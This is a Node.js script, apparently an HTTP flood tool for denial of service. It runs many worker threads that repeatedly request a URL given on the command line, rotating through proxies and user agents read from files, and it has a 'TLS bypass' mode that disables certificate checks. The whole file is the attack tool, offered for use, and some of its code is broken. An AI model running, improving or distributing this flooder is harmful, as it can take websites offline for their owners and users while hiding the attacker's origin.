const http = require('http');
const https = require('https');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const fs = require('fs');
const tls = require('tls');

// ANSI color codes
const colors = {
    red: '\x1b[31m',
    cyan: '\x1b[36m',
    reset: '\x1b[0m',
};

// Function to display the ASCII art banner
function displayBanner() {
    const banner = `
${colors.red}⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢠⡆⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⣷⣄⠀⠀⠀⠀⣾⣷⠀⠀⠀⠀⣠⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⠿⠃⠀⠀⠀⠉⠉⠁⠀⠀⠐⠿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀
⠀⠀⠀⣠⣶⣿⣿⡿⣿⣿⣿⡿⠋⠉⠀⠀⠉⠙⢿⣿⣿⡿⣿⣿⣷⦄⠀
⠀⢀⣼⣿⣿⠟⠁⢠⣿⣿⠏⠀⠀⢠⣤⣤⡀⠀⠀⢻⣿⣿⡀⠙⢿⣿⣿⣦
⣰⣿⣿⡟⠁⠀⠀⢸⣿⣿⠀⠀⠀⢿⣿⣿⡟⠀⠀⠈⣿⣿⡇⠀⠀⠙⣿⣿⣷⡄
⠈⠻⣿⣿⣦⣄⠀⠸⣿⣿⣆⠀⠀⠀⠉⠉⠀⠀⠀⣸⣿⣿⠃⢀⣤⣾⣿⣿⠟⠁
⠀⠀⠈⠻⣿⣿⣿⣶⣿⣿⣿⣦⣄⠀⠀⠀⢀⣠⣾⣿⣿⣿⣾⣿⣿⡿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠋⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣷⡦⠀⠀⠀⢀⣀⣀⠀⠀⠀⢴⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⠟⠁⠀⠀⠀⠘⣿⡇⠀⠀⠀⠀⠙⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠻⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀
${colors.reset}
`;
    console.log(banner);
}

// Read proxies from proxy.txt
function readProxies(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.split('\n').filter(line => line.trim() !== '');
    } catch (err) {
        console.error(`Error reading proxies: ${err.message}`);
        return [];
    }
}

// Read user agents from ua.txt
function readUserAgents(filePath) {
    try {
        const data = fs.readFileSync(filePath, 'utf8');
        return data.split('\n').filter(line => line.trim() !== '');
    } catch (err) {
        console.error(`Error reading user agents: ${err.message}`);
        return [];
    }
}

// Function to send requests
async function sendRequest(method, url, proxy, userAgent, isTLS) {
    return new Promise((resolve, reject) => {
        const targetUrl = new URL(url);
        const options = {
            hostname: targetUrl.hostname,
            port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
            path: targetUrl.pathname,
            method: method,
            headers: {
                'User-Agent': userAgent,
            },
            agent: new http.Agent({ keepAlive: true }), // Keep connection alive
        };

        if (proxy) {
            const [proxyHost, proxyPort] = proxy.split(':');
            options.hostname = proxyHost;
            options.port = proxyPort;
            options.path = url; // Use full URL path for the proxy
        }

        const client = isTLS ? https : (targetUrl.protocol === 'https:' ? https : http);

        const req = client.request(options, (res) => {
            console.log(`${method} Status: ${res.statusCode} through ${proxy || 'direct'}`);
            res.on('data', (chunk) => { });
            resolve();
        });

        req.on('error', (error) => {
            console.error(`Error: ${error.message}`);
            reject(error);
        });

        req.end();
    });
}

// Function to bypass TLS
function sendTlsBypassRequest(method, url, proxy, userAgent) {
    return new Promise((resolve, reject) => {
        const targetUrl = new URL(url);
        const options = {
            host: targetUrl.hostname,
            port: 443,
            path: targetUrl.pathname,
            method: method,
            headers: {
                'User-Agent': userAgent,
                'Host': targetUrl.hostname,
                'Connection': 'keep-alive',
            },
            secureContext: tls.createSecureContext({
                rejectUnauthorized: false // Ignore unauthorized certificate errors
            }),
        };

        const socket = tls.connect(options.port, options.host, options.secureContext, () => {
            console.log(`Connected to ${targetUrl.hostname} via TLS`);
            socket.write(`GET ${options.path} HTTP/1.1\r\n`);
            socket.write(`Host: ${options.host}\r\n`);
            socket.write(`User-Agent: ${userAgent}\r\n`);
            socket.write(`Connection: keep-alive\r\n`);
            socket.write(`\r\n`);
        });

        socket.on('data', (data) => {
            console.log(`Received data: ${data}`);
            resolve();
        });

        socket.on('error', (error) => {
            console.error(`TLS Error: ${error.message}`);
            reject(error);
        });

        socket.on('end', () => {
            console.log('Connection ended');
        });
    });
}

// Worker function to send requests aggressively
async function workerMethod(method, url, requests, proxies, userAgents, useTls) {
    for (let i = 0; i < requests; i++) {
        // Select a random proxy and user agent
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        if (useTls) {
            await sendTlsBypassRequest(method, url, proxy, userAgent);
        } else {
            await sendRequest(method, url, proxy, userAgent, url.startsWith('https://'));
        }
    }
}

// Main execution
if (isMainThread) {
    displayBanner();

    // Configuration parameters
    const targetUrl = process.argv[2];
    const numWorkers = parseInt(process.argv[3]) || 4; // Number of worker threads
    const totalRequests = parseInt(process.argv[4]) || 1000; // Total number of requests
    const useTls = process.argv[5] === 'true'; // Use TLS if set to true
    const proxies = readProxies('proxy.txt'); // Read proxies from proxy.txt
    const userAgents = readUserAgents('ua.txt'); // Read user agents from ua.txt

    const requestsPerWorker = Math.ceil(totalRequests / numWorkers); // Calculate requests per worker

    console.log(`Starting ${numWorkers} workers to send ${totalRequests} requests to ${targetUrl}`);
    
    // Create worker threads
    const workers = []; // To store workers
    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: {
                method: 'GET', // HTTP method (GET or POST)
                url: targetUrl,
                requests: requestsPerWorker,
                proxies: proxies,
                userAgents: userAgents,
                useTls: useTls,
            },
        });

        workers.push(worker); // Store the worker in the array

        worker.on('message', (msg) => {
            console.log(`Worker ${worker.threadId}: ${msg}`);
            workersCompleted.add(worker.threadId); // Mark this worker as completed
            checkAllWorkersCompleted(); // Check if all workers have completed
        });

        worker.on('error', (error) => {
            console.error(`Worker ${worker.threadId} error: ${error.message}`);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`Worker stopped with exit code ${code}`);
            }
        });
    }

    // Add an event listener for worker completion
    const workersCompleted = new Set(); // To keep track of completed workers

    // Function to check if all workers have completed
    function checkAllWorkersCompleted() {
        if (workersCompleted.size === numWorkers) {
            console.log("All workers have completed their tasks.");
            process.exit(0); // Exit the main process
        }
    }

} else {
    // Worker thread
    const { method, url, requests, proxies, userAgents, useTls } = workerData;

    // Execute the worker method
    workerMethod(method, url, requests, proxies, userAgents, useTls)
        .then(() => {
            parentPort.postMessage(`Worker ${process.pid} completed sending requests.`);
        })
        .catch((error) => {
            parentPort.postMessage(`Worker ${process.pid} encountered an error: ${error.message}`);
        });
}
